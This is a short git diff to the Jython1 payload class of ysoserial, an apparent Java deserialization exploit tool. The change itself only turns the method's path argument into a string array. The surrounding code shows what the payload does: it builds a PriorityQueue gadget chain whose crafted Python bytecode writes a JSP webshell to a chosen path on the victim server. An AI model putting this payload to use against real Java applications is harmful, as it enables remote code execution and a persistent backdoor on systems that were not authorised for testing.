@@ -24,7 +24,7 @@ import ysoserial.payloads.util.PayloadRunner;
 @Dependencies({ "org.python:jython-standalone:2.5.2" })
 public class Jython1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
  
-    public PriorityQueue getObject(String path) throws Exception {
+    public PriorityQueue getObject(String[] path) throws Exception {
 
         // Set payload parameters
         String webshell= "<%@ page import=\"java.util.*,java.io.*\"%>\n" +
@@ -63,7 +63,7 @@ public class Jython1 extends PayloadRunner implements ObjectPayload<PriorityQueu
             "53";      // 25 RETURN_VALUE
 
         // Helping consts and names
-        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(path), new PyString("w"), new PyString(webshell)};
+        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(path[0]), new PyString("w"), new PyString(webshell)};
         String[] names = new String[]{"open", "write"};
 
         // Generating PyBytecode wrapper for our python bytecode
